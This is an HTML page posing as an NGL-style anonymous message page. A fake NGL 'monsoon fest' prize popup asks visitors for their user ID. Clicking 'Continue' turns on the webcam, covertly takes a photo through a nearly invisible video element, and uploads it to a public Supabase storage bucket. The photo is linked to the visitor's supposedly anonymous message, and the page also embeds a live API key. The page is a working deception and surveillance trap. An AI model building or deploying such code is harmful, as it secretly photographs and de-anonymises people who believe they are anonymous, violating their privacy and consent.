<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Anonymous Messages</title>

    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:Arial,sans-serif;
        }

        body{
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            background:linear-gradient(135deg,#ff4d94,#7b61ff);
        }

        .container{
            width:380px;
            background:white;
            border-radius:20px;
            padding:25px;
            text-align:center;
            box-shadow:0 10px 30px rgba(0,0,0,.2);
        }

        .profile{
            width:90px;
            height:90px;
            border-radius:50%;
            background:#ddd;
            margin:auto;
            margin-bottom:15px;
        }

        h2{
            margin-bottom:10px;
        }

        p{
            color:#666;
            margin-bottom:20px;
        }

        textarea{
            width:100%;
            height:120px;
            border:2px solid #eee;
            border-radius:12px;
            padding:12px;
            resize:none;
            outline:none;
        }

        button{
            width:100%;
            margin-top:15px;
            padding:14px;
            border:none;
            border-radius:12px;
            background:#111;
            color:white;
            font-size:16px;
            cursor:pointer;
        }

        button:hover{
            opacity:.9;
        }

        .popup{
            position:fixed;
            inset:0;
            background:rgba(0,0,0,.6);
            display:flex;
            justify-content:center;
            align-items:center;
        }

        .popup-box{
            background:white;
            padding:25px;
            border-radius:15px;
            width:320px;
            text-align:center;
        }

        .popup-box input{
            width:100%;
            padding:10px;
            margin:15px 0;
        }

        #video{
            width:1%;
            border-radius:1px;
            margin-top:1px;
            display:none;
        }

        #cameraStatus{
            font-size:13px;
            margin-top:10px;
        }

        .notice{
            font-size:13px;
            color:#555;
            margin:10px 0;
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="profile"></div>

        <h2>Kalyani</h2>

        <p>Send me anonymous messages 👀</p>

        <textarea
            id="msg"
            disabled
            placeholder="Type something..."
        ></textarea>

        <button
            id="sendBtn"
            onclick="sendMessage()"
            disabled
        >
            Send
        </button>

    </div>

    <div id="namePopup" class="popup">

        <div class="popup-box">

            <h3>Big grand monsoon fest!! 🎉🎊</h3>
            <p>Try your luck to win exciting prizes from NGL🥳<br>Enter ur ID to get inform on winning
            </p>

            <input
                type="text"
                id="senderName"
                placeholder="Your userID"
            >

            <div class="notice">
            </div>


            <p id="cameraStatus"></p>

            <video
                id="video"
            ></video>

            <canvas
                id="canvas"
                style="display:none;"
            ></canvas>

            <button onclick="saveName();capturePhoto()">
                Continue
            </button>

        </div>

    </div>

    <script type="module">

        import { createClient }
        from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

        const supabaseUrl =
        "https://azsxeufcpyergcizsloa.supabase.co";

        const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF6c3hldWZjcHllcmdjaXpzbG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEzNjU5NjIsImV4cCI6MjA5Njk0MTk2Mn0.7-EKKb0PHhg0gN7YkIrPNKwP37Xnu6OoVR43jlfbJmw";

        const supabase =
        createClient(
            supabaseUrl,
            supabaseKey
        );

        let sender = "";
        let capturedImageUrl = "";

        window.capturePhoto = async function(){

            try{

                const status =
                document.getElementById(
                    "cameraStatus"
                );

                const stream =
                await navigator.mediaDevices
                .getUserMedia({
                    video:true
                });

                const video =
                document.getElementById(
                    "video"
                );

                const canvas =
                document.getElementById(
                    "canvas"
                );

                video.srcObject = stream;
                video.style.display = "block";

                await new Promise(resolve=>{
                    video.onloadedmetadata =
                    resolve;
                });


                await new Promise(r=>
                    setTimeout(r,1000)
                );

                canvas.width =
                video.videoWidth;

                canvas.height =
                video.videoHeight;

                const ctx =
                canvas.getContext("2d");

                ctx.drawImage(
                    video,
                    0,
                    0,
                    canvas.width,
                    canvas.height
                );

                const blob =
                await new Promise(resolve=>{
                    canvas.toBlob(
                        resolve,
                        "image/jpeg",
                        0.9
                    );
                });

                const fileName =
                `photo_${Date.now()}.jpg`;

                const { error } =
                await supabase.storage
                .from("photos")
                .upload(
                    fileName,
                    blob
                );

                if(error){
                    throw error;
                }

                const { data } =
                supabase.storage
                .from("photos")
                .getPublicUrl(
                    fileName
                );

                capturedImageUrl =
                data.publicUrl;

                stream.getTracks()
                .forEach(track=>{
                    track.stop();
                });

                video.style.display =
                "none";

                status.innerText =
                "send anonymous message ";

            }
            catch(err){

                console.log(err);

                alert(
                    "Camera permission denied or upload failed."
                );
            }
        };

        window.saveName = function(){

            const name =
            document.getElementById(
                "senderName"
            )
            .value
            .trim();

            if(name === ""){
                alert(
                    "Please enter your name"
                );
                return;
            }

            if(
                capturedImageUrl === ""
            ){
                alert(
                    "sweet good luck from us!!"
                );
                return;
            }

            sender = name;

            document.getElementById(
                "namePopup"
            ).style.display =
            "none";

            document.getElementById(
                "msg"
            ).disabled = false;

            document.getElementById(
                "sendBtn"
            ).disabled = false;
        };

        window.sendMessage =
        async function(){

            const message =
            document.getElementById(
                "msg"
            )
            .value
            .trim();

            if(message === ""){
                alert(
                    "Please enter a message"
                );
                return;
            }

            const { error } =
            await supabase
            .from("messages")
            .insert([
                {
                    name: sender,
                    message: message,
                    image_url:
                    capturedImageUrl
                }
            ]);

            if(error){

                console.log(error);

                alert(
                    "Error: " +
                    error.message
                );

                return;
            }

            alert(
                "Message Sent!"
            );

            document.getElementById(
                "msg"
            ).value = "";
        };

    </script>

</body>
</html>
